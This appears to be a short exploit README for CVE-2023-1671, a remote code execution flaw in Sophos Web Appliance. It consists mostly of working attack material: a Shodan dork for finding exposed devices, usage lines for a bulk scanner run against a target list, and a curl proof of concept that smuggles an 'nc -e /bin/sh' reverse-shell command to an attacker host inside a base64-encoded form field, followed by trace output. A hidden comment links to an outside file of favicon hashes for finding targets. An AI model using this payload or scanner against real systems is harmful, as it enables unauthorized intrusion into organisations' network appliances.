## CVE-2023-1671
Sophos Web Appliance RCE
- Shodan dork: <br/>
```
title:"Sophos Web Appliance"
```
<!-- Here is an Easter Egg for inquiring minds
shodan-favicon-hashes - https://mega.nz/file/ctdH3LAB#lnE0GUkfCacwA18wR1VQI6TxIJ4OKM_6YKQdpHY4GN0
-->

### Usage
```
chmod +x scanner.sh
bash scanner.sh target.txt
```  
### POC
```
curl -k --trace-ascii % "https://target_ip_addr/index.php?c=blocked&action=continue" -d "args_reason=filetypewarn&url=$RANDOM&filetype=$RANDOM&user=$RANDOM&user_encoded=$(echo -n "';nc -e /bin/sh attacker_ip_addr 4444 #" | base64)"

=> Send header, 184 bytes (0xb8)
0000: POST /index.php?c=blocked&action=continue HTTP/1.1
0034: Host: XX.XX.XX.XX
004a: User-Agent: curl/7.88.1
0063: Accept: */*
0070: Content-Length: 120
0085: Content-Type: application/x-www-form-urlencoded
00b6:
=> Send data, 120 bytes (0x78)
0000: args_reason=filetypewarn&url=16625&filetype=5831&user=4525&user_
0040: encoded=**************************
```
